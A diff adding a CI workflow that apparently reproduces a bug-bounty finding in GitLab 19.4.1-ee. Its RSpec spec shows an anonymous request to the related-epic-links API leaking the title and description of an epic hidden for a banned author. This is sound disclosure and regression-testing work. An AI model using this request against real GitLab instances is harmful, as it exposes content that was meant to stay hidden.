@@ -1,0 +1,139 @@
+name: GitLab 19.4.1 Hidden Related Epic Repro
+
+on:
+  push:
+    branches:
+      - h1-gitlab-hidden-related-epic
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 90
+
+    container:
+      image: registry.gitlab.com/gitlab-org/gitlab-build-images/ci/debian-trixie-slim-ruby-3.3.12-golang-1.25-node-22.12-python-3.12-postgresql-17:rubygems-3.6-git-2.51-lfs-2.9-chrome-151-yarn-1.22-graphicsmagick-1.3.36-poetry-2.2
+
+    services:
+      postgres:
+        image: registry.gitlab.com/gitlab-org/gitlab-build-images:postgres-17
+        env:
+          POSTGRES_HOST_AUTH_METHOD: trust
+      redis:
+        image: redis:7.2-alpine
+
+    env:
+      RAILS_ENV: test
+      NODE_ENV: test
+      POSTGRES_HOST_AUTH_METHOD: trust
+      USE_REDIS_CLUSTER: "false"
+      DECOMPOSED_DB: "false"
+      CI_JOB_NAME: "rspec security repro"
+      BUNDLE_WITHOUT: ""
+      SETUP_DB: "true"
+      GITLAB_TEST_EAGER_LOAD: "0"
+
+    steps:
+      - name: Clone exact affected GitLab release
+        shell: bash
+        run: |
+          set -euxo pipefail
+          git clone --depth 1 --branch v19.4.1-ee https://gitlab.com/gitlab-org/gitlab.git gitlab
+          cd gitlab
+          git rev-parse HEAD | tee ../gitlab-revision.txt
+          git describe --tags --exact-match | tee ../gitlab-tag.txt
+
+      - name: Add focused exploit regression spec
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cat > gitlab/ee/spec/requests/api/related_epic_links_hidden_author_security_spec.rb <<'RUBY'
+          # frozen_string_literal: true
+
+          require 'spec_helper'
+
+          RSpec.describe API::RelatedEpicLinks, feature_category: :portfolio_management do
+            let_it_be(:banned_author) { create(:user, :banned) }
+            let_it_be(:group) { create(:group, :public) }
+            let_it_be(:source_epic) { create(:epic, group: group) }
+            let_it_be(:hidden_epic) do
+              create(
+                :epic,
+                group: group,
+                author: banned_author,
+                title: 'H1-HIDDEN-EPIC-TITLE-7c1d9d',
+                description: 'H1-HIDDEN-EPIC-DESCRIPTION-7c1d9d'
+              )
+            end
+            let_it_be(:related_link) do
+              create(:related_epic_link, source: source_epic, target: hidden_epic)
+            end
+
+            before do
+              stub_licensed_features(epics: true, related_epics: true)
+            end
+
+            it 'anonymously discloses a hidden epic through the related-epic-links list' do
+              hidden_work_item = hidden_epic.work_item
+
+              expect(hidden_work_item.hidden?).to be(true)
+              expect(Ability.allowed?(nil, :read_work_item, hidden_work_item)).to be(false)
+              expect(hidden_work_item.confidential?).to be(false)
+              expect(source_epic.work_item.namespace_id).to eq(hidden_work_item.namespace_id)
+
+              get api("/groups/#{group.id}/related_epic_links")
+
+              expect(response).to have_gitlab_http_status(:ok)
+
+              leaked_link = json_response.find { |entry| entry['id'] == related_link.id }
+              expect(leaked_link).not_to be_nil
+
+              leaked_target = leaked_link.fetch('target_epic')
+              expect(leaked_target['title']).to eq('H1-HIDDEN-EPIC-TITLE-7c1d9d')
+              expect(leaked_target['description']).to eq('H1-HIDDEN-EPIC-DESCRIPTION-7c1d9d')
+
+              puts "SECURITY_REPRO hidden=#{hidden_work_item.hidden?} allowed=#{Ability.allowed?(nil, :read_work_item, hidden_work_item)}"
+              puts "SECURITY_REPRO status=#{response.status} link_id=#{related_link.id}"
+              puts "SECURITY_REPRO leaked_title=#{leaked_target['title']}"
+              puts "SECURITY_REPRO leaked_description=#{leaked_target['description']}"
+            end
+          end
+          RUBY
+
+      - name: Prepare GitLab test environment
+        shell: bash
+        run: |
+          set -euxo pipefail
+          cd gitlab
+          bash -lc '. scripts/prepare_build.sh' 2>&1 | tee ../prepare-build.log
+
+      - name: Run exploit reproduction against upstream 19.4.1-ee
+        shell: bash
+        run: |
+          set -o pipefail
+          cd gitlab
+          bin/rspec ee/spec/requests/api/related_epic_links_hidden_author_security_spec.rb --format documentation 2>&1 | tee ../reproduction.log
+
+      - name: Run upstream related-epic regression suite
+        shell: bash
+        run: |
+          set -o pipefail
+          cd gitlab
+          bin/rspec ee/spec/requests/api/related_epic_links_spec.rb --format progress 2>&1 | tee ../upstream-related-epic-suite.log
+
+      - name: Preserve evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gitlab-hidden-related-epic-repro
+          if-no-files-found: warn
+          path: |
+            gitlab-revision.txt
+            gitlab-tag.txt
+            prepare-build.log
+            reproduction.log
+            upstream-related-epic-suite.log
+            gitlab/ee/spec/requests/api/related_epic_links_hidden_author_security_spec.rb
